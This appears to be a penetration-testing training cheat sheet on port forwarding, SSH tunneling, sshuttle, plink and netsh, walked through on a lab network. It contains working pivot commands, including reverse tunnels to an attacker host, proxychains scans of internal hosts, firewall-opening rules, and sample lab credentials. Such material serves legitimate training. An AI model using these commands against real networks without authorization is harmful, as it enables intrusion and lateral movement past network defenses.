# Port Redirection and SSH Tunneling - Cheat Sheet & Walkthrough

## Table of Contents
1. [Why Port Redirection and Tunneling](#1-why-port-redirection-and-tunneling)
2. [Port Forwarding with Linux Tools (Socat)](#2-port-forwarding-with-linux-tools-socat)
3. [SSH Tunneling](#3-ssh-tunneling)
4. [Port Forwarding with Windows Tools](#4-port-forwarding-with-windows-tools)
5. [Quick Reference](#5-quick-reference)

---

## 1. Why Port Redirection and Tunneling

### Network Topologies

| Topology | Description | Security |
|----------|-------------|----------|
| **Flat Network** | All devices can communicate freely | Poor - easy to pivot |
| **Segmented Network** | Broken into smaller subnets | Better - limits lateral movement |

### Common Network Security Devices

| Device | Purpose | Impact on Attackers |
|--------|---------|---------------------|
| **Firewall** | Filters traffic by IP/port | Blocks inbound/outbound connections |
| **Deep Packet Inspection** | Inspects packet contents | Can detect tunneling |
| **NAT** | Maps private to public IPs | Requires port forwarding |
| **IPS/IDS** | Detects malicious traffic | May alert on tunneling |

### Port Redirection vs Tunneling

| Technique | Description | Example |
|-----------|-------------|---------|
| **Port Redirection** | Redirects packets from one socket to another | Socat listening on 2345 → 5432 |
| **Tunneling** | Encapsulates one protocol within another | SSH tunneling HTTP over SSH |

---

## 2. Port Forwarding with Linux Tools (Socat)

### 2.1 Scenario Overview

```
WAN (Kali) → CONFLUENCE01 (10.4.50.63) → PGDATABASE01 (10.4.50.215:5432)
                    │
                    └── PostgreSQL credentials found in config
```

### 2.2 Installing Socat

```bash
# Check if installed
which socat

# Install if needed
sudo apt install socat
```

### 2.3 Socat Port Forward Syntax

```bash
socat TCP-LISTEN:LISTEN_PORT,fork TCP:TARGET_IP:TARGET_PORT
```

**Options Explained**:
- `TCP-LISTEN:2345` - Listen on TCP port 2345
- `fork` - Handle multiple connections
- `TCP:10.4.50.215:5432` - Forward to target

### 2.4 Example: PostgreSQL Port Forward

**On CONFLUENCE01**:
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

**From Kali**:
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
# Password: D@t4basePassw0rd!
```

### 2.5 Socat Alternatives

| Tool | Description |
|------|-------------|
| **rinetd** | Daemon-based port forwarding |
| **Netcat + FIFO** | Manual port forwarding |
| **iptables** | Kernel-level forwarding (requires root) |

---

## 3. SSH Tunneling

### 3.1 SSH Tunneling Overview

SSH tunneling encapsulates data within an SSH connection, providing:
- **Encryption** - All traffic is encrypted
- **Authentication** - SSH authentication required
- **Stealth** - Blends with legitimate SSH traffic

### 3.2 SSH Local Port Forwarding

#### Syntax
```bash
ssh -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@SSH_SERVER
```

#### How It Works
```
SSH Client (CONFLUENCE01) → SSH Server (PGDATABASE01)
        ↓                           ↓
   Listens on PORT           Forwards to DEST:PORT
```

#### Example: SMB Share Access
```bash
# On CONFLUENCE01
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

**From Kali**:
```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

#### Local Port Forward Diagram
```
Kali → CONFLUENCE01:4455 → [SSH Tunnel] → PGDATABASE01 → 172.16.50.217:445
```

---

### 3.3 SSH Dynamic Port Forwarding

#### Syntax
```bash
ssh -D [LOCAL_IP:]PORT user@SSH_SERVER
```

#### How It Works
- Creates a SOCKS proxy on the SSH client
- Forwards traffic to any destination the SSH server can reach
- Requires SOCKS-compatible tools or Proxychains

#### Example: SOCKS Proxy Setup
```bash
# On CONFLUENCE01
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

#### Proxychains Configuration
```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 192.168.50.63 9999
```

#### Using Proxychains
```bash
# smbclient through SOCKS
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

# Nmap through SOCKS
proxychains nmap -sT --top-ports=20 -Pn 172.16.50.217
```

#### Dynamic Port Forward Diagram
```
Kali → CONFLUENCE01:9999 (SOCKS) → [SSH Tunnel] → PGDATABASE01 → Any Host:Port
```

---

### 3.4 SSH Remote Port Forwarding

#### Syntax
```bash
ssh -R [SSH_SERVER_IP:]SSH_SERVER_PORT:DEST_IP:DEST_PORT user@SSH_SERVER
```

#### How It Works
- Listening port bound to SSH server (Kali)
- Packets forwarded from SSH client (CONFLUENCE01)

#### Example: PostgreSQL Access Through Firewall
```bash
# Enable SSH on Kali
sudo systemctl start ssh

# On CONFLUENCE01 (through firewall)
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

**From Kali**:
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

#### Remote Port Forward Diagram
```
Kali:2345 (SSH Server) ← [SSH Tunnel] ← CONFLUENCE01 → PGDATABASE01:5432
```

---

### 3.5 SSH Remote Dynamic Port Forwarding

#### Syntax
```bash
ssh -R [SSH_SERVER_IP:]PORT user@SSH_SERVER
```

#### Requirements
- OpenSSH client >= 7.6
- Creates SOCKS proxy on SSH server (Kali)

#### Example
```bash
# On CONFLUENCE01
ssh -N -R 9998 kali@192.168.118.4
```

**Proxychains Config**:
```bash
socks5 127.0.0.1 9998
```

**Usage**:
```bash
proxychains nmap -sT --top-ports=20 -Pn 10.4.50.64
```

---

### 3.6 SSH Tunneling Comparison

| Type | Option | Listening Side | Forwarding Side | Single Socket? |
|------|--------|---------------|-----------------|----------------|
| **Local** | `-L` | SSH Client | SSH Server | Yes |
| **Dynamic** | `-D` | SSH Client (SOCKS) | SSH Server | No |
| **Remote** | `-R` | SSH Server | SSH Client | Yes |
| **Remote Dynamic** | `-R` | SSH Server (SOCKS) | SSH Client | No |

---

### 3.7 SSH Tunneling Quick Reference

#### Port Forwarding Options
```bash
# Local port forward
ssh -L LOCAL_PORT:DEST_IP:DEST_PORT user@server

# Dynamic (SOCKS) port forward
ssh -D LOCAL_PORT user@server

# Remote port forward
ssh -R REMOTE_PORT:DEST_IP:DEST_PORT user@server

# Remote dynamic (SOCKS) port forward (OpenSSH 7.6+)
ssh -R REMOTE_PORT user@server
```

#### Common SSH Flags
| Flag | Purpose |
|------|---------|
| `-N` | No remote commands (port forwarding only) |
| `-f` | Run in background |
| `-v` | Verbose output |
| `-L` | Local port forward |
| `-D` | Dynamic (SOCKS) port forward |
| `-R` | Remote port forward |

---

### 3.8 sshuttle

#### What is sshuttle?
- Turns SSH connection into VPN-like tunnel
- Sets up local routes for transparent proxying
- Requires root on SSH client, Python3 on SSH server

#### Syntax
```bash
sshuttle -r user@server:port SUBNETS
```

#### Example
```bash
# Create port forward on CONFLUENCE01
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22

# Run sshuttle from Kali
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

**Result**: Transparent access to all hosts in those subnets.

---

## 4. Port Forwarding with Windows Tools

### 4.1 OpenSSH Client (ssh.exe)

#### Location
```
C:\Windows\System32\OpenSSH\ssh.exe
```

#### Availability
- Windows 10 1803+ (April 2018 Update)
- Windows Server 2019+
- Feature-on-Demand since 1709

#### Remote Dynamic Port Forward Example
```cmd
# On Windows host
ssh -N -R 9998 kali@192.168.118.4
```

#### Version Check
```cmd
ssh -V
# OpenSSH_for_Windows_8.1p1 (>= 7.6 supports remote dynamic)
```

---

### 4.2 Plink (PuTTY Command Line)

#### Download Location
```bash
/usr/share/windows-resources/binaries/plink.exe
```

#### Remote Port Forward Syntax
```cmd
plink.exe -ssh -l USERNAME -pw PASSWORD -R LOCAL_PORT:DEST_IP:DEST_PORT SSH_SERVER
```

#### Example
```cmd
# On Windows host
plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

#### Non-Interactive Usage (without TTY)
```cmd
cmd.exe /c echo y | plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

**From Kali**:
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

#### Plink Limitations
- No remote dynamic port forwarding
- Password on command line (security risk)

---

### 4.3 Netsh (Network Shell)

#### Portproxy Syntax (Admin Required)
```cmd
netsh interface portproxy add v4tov4 listenport=PORT listenaddress=IP connectport=PORT connectaddress=IP
```

#### Example
```cmd
# Create port forward
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

# Show all portproxies
netsh interface portproxy show all
```

#### Create Firewall Rule
```cmd
netsh advfirewall firewall add rule name="rule_name" protocol=TCP dir=in localip=IP localport=PORT action=allow
```

#### Verify
```cmd
netstat -anp TCP | find "2222"
```

#### Cleanup
```cmd
# Delete firewall rule
netsh advfirewall firewall delete rule name="rule_name"

# Delete portproxy
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

---

## 5. Quick Reference

### Attack Flow Diagrams

#### Local Port Forward
```
[Kali] → [CONFLUENCE01:4455] → [SSH Tunnel] → [PGDATABASE01] → [HRSHARES:445]
```

#### Dynamic Port Forward
```
[Kali] → [CONFLUENCE01:9999 (SOCKS)] → [SSH Tunnel] → [PGDATABASE01] → [Any Host:Any Port]
```

#### Remote Port Forward
```
[Kali:2345 (SSH Server)] ← [SSH Tunnel] ← [CONFLUENCE01] → [PGDATABASE01:5432]
```

#### Remote Dynamic Port Forward
```
[Kali:9998 (SOCKS)] ← [SSH Tunnel] ← [CONFLUENCE01] → [Any Host:Any Port]
```

### Command Quick Reference

#### Socat
```bash
# Listen and forward
socat TCP-LISTEN:PORT,fork TCP:TARGET_IP:TARGET_PORT
```

#### SSH Local
```bash
ssh -N -L LOCAL_PORT:DEST_IP:DEST_PORT user@server
```

#### SSH Dynamic
```bash
ssh -N -D LOCAL_PORT user@server
```

#### SSH Remote
```bash
ssh -N -R SERVER_PORT:DEST_IP:DEST_PORT user@server
```

#### SSH Remote Dynamic
```bash
ssh -N -R SERVER_PORT user@server
```

#### sshuttle
```bash
sshuttle -r user@server:port SUBNETS
```

#### Windows ssh.exe
```cmd
ssh -N -R SERVER_PORT user@server
```

#### Plink
```cmd
plink.exe -ssh -l user -pw pass -R SERVER_PORT:DEST_IP:DEST_PORT server
```

#### Netsh
```cmd
# Create forward
netsh interface portproxy add v4tov4 listenport=PORT listenaddress=IP connectport=PORT connectaddress=IP

# Firewall rule
netsh advfirewall firewall add rule name="NAME" protocol=TCP dir=in localip=IP localport=PORT action=allow
```

### Proxychains Configuration

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 SOCKS_IP SOCKS_PORT
```

### Key Takeaways

| Concept             | Key Point                           |
| ------------------- | ----------------------------------- |
| **Flat Network**    | Easy to pivot - rare in real world  |
| **Socat**           | Simple port forwarding on Linux     |
| **Local Forward**   | SSH client listens, server forwards |
| **Dynamic Forward** | SOCKS proxy - any destination       |
| **Remote Forward**  | SSH server listens, client forwards |
| **Remote Dynamic**  | SOCKS proxy on SSH server           |
| **sshuttle**        | VPN-like transparent tunneling      |
| **ssh.exe**         | OpenSSH client on Windows           |
| **Plink**           | Command-line PuTTY                  |
| **Netsh**           | Native Windows port forwarding      |